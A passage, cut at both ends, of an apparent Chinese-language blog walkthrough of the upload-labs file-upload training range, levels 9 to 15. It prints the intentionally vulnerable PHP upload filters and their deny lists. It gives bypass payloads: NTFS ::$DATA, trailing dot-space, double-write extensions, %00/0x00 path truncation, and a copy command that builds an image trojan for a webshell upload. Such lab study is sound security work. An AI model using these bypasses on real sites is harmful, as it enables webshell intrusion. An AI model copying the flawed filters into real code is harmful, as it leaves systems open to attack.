class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>少了$file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符串::$DATA，在Windows系统下，如果上传test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并可以被解析。</p><p>所以上传1.php::$DATA，再访问1.php即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php::$DATA</span><br><span class="line">//这个方法还是会被重命名代码影响的，因为存储时，windows处理的是：随机数.php::$DATA，而重命名则是代码层面就完成了的是，因此要要访问的php文件还是：随机数.php</span><br></pre></td></tr></table></figure><h4 id="Pass-10黑名单，点号、空格绕过升级版"><a href="#Pass-10黑名单，点号、空格绕过升级版" class="headerlink" title="Pass-10黑名单，点号、空格绕过升级版"></a>Pass-10黑名单，点号、空格绕过升级版</h4><p><strong>注：linux不会自动删除末尾点，因此1.php.与1.php是不一样的，不适用此方法</strong></p><h5 id="解题1-9"><a href="#解题1-9" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次所有防御策略都是存在的，包括末尾点过滤，空格过滤。</p><p>但仍然可以使用payload绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php. .</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先，$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);移除两侧空白字符，1.php. .不变。</span><br><span class="line">然后，$file_name = deldot($file_name);删除文件名末尾的点，得到1.php. 。（注意末尾有个空格）</span><br><span class="line">然后，$file_ext = strrchr($file_name, &#x27;.&#x27;);这里注意，strrchr() 函数是查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。即找到1.php. 的最后一个.，然后返回. 给$file_ext。</span><br><span class="line">然后，$file_ext = strtolower($file_ext); 字符转换为小写，还是得. 。</span><br><span class="line">然后，$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);去除字符串::$DATA没用，还是得. 。</span><br><span class="line">最后，$file_ext = trim($file_ext); 首尾去空，得.。</span><br><span class="line">于是将$file_ext=&#x27;.&#x27;与黑名单数组对比，顺利通过，$img_path=UPLOAD_PATH.&#x27;/&#x27;.$file_name;时，$file_name=&#x27;1.php. &#x27;,该文件名会被传至windows服务器，服务器会默认删去. ，得到最终文件名1.php</span><br></pre></td></tr></table></figure><p><strong>注：如果$img_path &#x3D; UPLOAD_PATH.’&#x2F;‘.date(“YmdHis”).rand(1000,9999).$file_ext;即有文件重命名代码也不行，因为此时，文件名会是：随机数..。（因为此时，$file_ext&#x3D;’.’）</strong></p><h4 id="Pass-11黑名单，双写绕过"><a href="#Pass-11黑名单，双写绕过" class="headerlink" title="Pass-11黑名单，双写绕过"></a>Pass-11黑名单，双写绕过</h4><h5 id="解题1-10"><a href="#解题1-10" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);<span class="comment">//将匹配到的字符过滤为空</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是另一种过滤方法，不同于关键字检测过滤，即使我们使用1.php.企图点号绕过，$file_name &#x3D; str_ireplace($deny_ext,””, $file_name);过滤语句也会将php直接替换为’’，而上传一个1..的文件，使其无效。</p><p>但针对这种方式，可以使用双写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.pphphp</span><br></pre></td></tr></table></figure><p>这样即使中间的php过滤为’’，也可以得到1.php</p><h4 id="Pass-12白名单，GET型-00截断"><a href="#Pass-12白名单，GET型-00截断" class="headerlink" title="Pass-12白名单，GET型%00截断"></a>Pass-12白名单，GET型%00截断</h4><p><strong>条件：1，php版本低于5.3.29；2，magic_quotes_gpc为off</strong></p><h5 id="解题1-11"><a href="#解题1-11" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//找到字符串中最后一个点，返回该点后面的所有字符，即取后缀</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;<span class="comment">//如果后缀在白名单数组内，重命名文件并上传至相应文件夹。</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr():参数1：被切割的字符串；参数2：从哪里开始；参数3（可选）：长度，默认是到结尾；</span><br><span class="line">返回从参数2位置开始到字符串末尾的子字符串。</span><br><span class="line">strrpos():查找字符串在另一字符串中最后一次出现的位置。</span><br></pre></td></tr></table></figure><p>当截断需要在URL处进行时，以%00对文件名进行截断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=1.php%00.jpg</span><br></pre></td></tr></table></figure><p>原理%00转码后，相当于0x00，当它作为文件名被move_uploaded_file()函数处理时，函数读到0x00就会认为已经结束了，不会再读后面的内容。那么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当文件名在后缀名判断时，会以.jpg作为后缀判断；但当move_uploaded_file()函数处理时，却只会将1.php作为文件名进行保存，从而绕过了白名单限制。</span><br></pre></td></tr></table></figure><h4 id="Pass-13白名单，POST型0x00截断"><a href="#Pass-13白名单，POST型0x00截断" class="headerlink" title="Pass-13白名单，POST型0x00截断"></a>Pass-13白名单，POST型0x00截断</h4><p><strong>条件：1，php版本低于5.3.29；2，magic_quotes_gpc为off</strong></p><h5 id="解题1-12"><a href="#解题1-12" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题与上题差不多，只是传参形式变成POST了，那么%00不会被自动编码为0x00，就需要在Hex编码中进行改变：</p><p>先传一个正常.jpg文件，然后在路径处（文件名这个位置在这题里会被重命名，还不知道直接对文件名进行截断行不行，记得时可以的，以后遇上类似题目再来补充）拼接phpinfo.php a</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220129174130806.png" alt="image-20220129174130806"></p><p>接着点进hex页面，把代表空格的20改成00即可</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220129174540130.png" alt="image-20220129174540130"></p><p>这样一来，$img_path就变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/phpinfo.php[0x00]a/随机数.jpg</span><br></pre></td></tr></table></figure><p>当move_uploaded_file()处理文件时，函数就会读到0x00处截止，那么交给操作系统保存的文件路径就变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/phpinfo.php</span><br></pre></td></tr></table></figure><p>成功绕过白名单上传了webshell</p><h4 id="Pass-14文件头校验，文件包含图片马"><a href="#Pass-14文件头校验，文件包含图片马" class="headerlink" title="Pass-14文件头校验，文件包含图片马"></a>Pass-14文件头校验，文件包含图片马</h4><h5 id="解题1-13"><a href="#解题1-13" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令制作图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/a+1.txt/b 2.jpg</span><br></pre></td></tr></table></figure><p>1.jpg是一张正常图片，1.txt内包含木马，两者合并而成的2.jpg就是一张可以绕过文件头校验的图片马，其本质是一张图片，需要文件包含漏洞包含该图片马，才能正常解析其内的恶意代码。</p><h4 id="Pass-15getimagesize-校验，文件包含图片马"><a href="#Pass-15getimagesize-校验，文件包含图片马" class="headerlink" title="Pass-15getimagesize()校验，文件包含图片马"></a>Pass-15getimagesize()校验，文件包含图片马</h4><h5 id="解题1-14"><a href="#解题1-14" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span 